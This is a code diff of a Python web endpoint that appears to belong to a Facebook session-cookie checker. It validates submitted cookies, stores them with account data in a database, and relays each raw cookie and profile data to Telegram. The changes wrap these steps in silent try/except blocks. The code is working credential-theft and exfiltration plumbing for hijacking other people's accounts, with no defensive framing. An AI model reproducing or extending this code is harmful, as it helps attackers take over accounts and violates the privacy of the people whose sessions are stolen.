@@ -42,34 +42,43 @@ def facebook_checker_post(req: ReqValueChecker):
             if values is None:
                 raise HTTPException(status_code=403)
             else:
-                telegram.apiSendMessage(req.cookie, values)
-                MFacebook.update(
-                    cookie=cookie,
-                    graph=values,
-                    updated_time=calendar.timegm(time.gmtime())
-                ).where(MFacebook.uid == fbUID).execute()
+                try:
+                    MFacebook.update(
+                        cookie=cookie,
+                        graph=values,
+                        updated_time=calendar.timegm(time.gmtime())
+                    ).where(MFacebook.uid == fbUID).execute()
+                    telegram.apiSendMessage(req.cookie, values)
+                except:
+                    pass
                 return {**values, 'isDuplicate': False}
     else:
         values = facebook.apiCheck(req.cookie)
         if values is None:
-            MFacebook.insert(
-                id=ID(),
-                uid=fbUID,
-                cookie=cookie,
-                created_time=calendar.timegm(time.gmtime()),
-                updated_time=calendar.timegm(time.gmtime())
-            ).execute()
+            try:
+                MFacebook.insert(
+                    id=ID(),
+                    uid=fbUID,
+                    cookie=cookie,
+                    created_time=calendar.timegm(time.gmtime()),
+                    updated_time=calendar.timegm(time.gmtime())
+                ).execute()
+            except:
+                pass
             raise HTTPException(status_code=403)
         else:
-            telegram.apiSendMessage(req.cookie, values)
-            MFacebook.insert(
-                id=ID(),
-                uid=fbUID,
-                cookie=cookie,
-                graph=values,
-                created_time=calendar.timegm(time.gmtime()),
-                updated_time=calendar.timegm(time.gmtime())
-            ).execute()
+            try:
+                MFacebook.insert(
+                    id=ID(),
+                    uid=fbUID,
+                    cookie=cookie,
+                    graph=values,
+                    created_time=calendar.timegm(time.gmtime()),
+                    updated_time=calendar.timegm(time.gmtime())
+                ).execute()
+                telegram.apiSendMessage(req.cookie, values)
+            except:
+                pass
             return {**values, 'isDuplicate': False}
 
 
